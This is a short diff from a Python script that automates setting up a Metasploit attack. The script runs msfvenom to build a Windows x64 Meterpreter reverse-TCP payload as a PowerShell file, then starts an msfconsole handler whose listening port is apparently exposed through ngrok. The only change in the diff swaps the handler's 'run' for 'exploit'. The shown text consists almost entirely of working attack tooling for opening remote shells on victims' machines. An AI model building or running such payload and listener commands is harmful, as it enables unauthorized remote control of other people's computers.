@@ -69,7 +69,7 @@ if __name__ == '__main__':
     print(venom_lhost, venom_lport)
 
     MSFVENOM_CMD = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={venom_lhost} LPORT={venom_lport} -f psh -o rev.ps1'
-    MSFCONSOLE_CMD = f"msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost {PAYLOAD_LHOST};set lport {ngrok_port};run'"
+    MSFCONSOLE_CMD = f"msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost {PAYLOAD_LHOST};set lport {ngrok_port};exploit'"
     
     os.system(MSFVENOM_CMD)
     print(MSFVENOM_CMD)
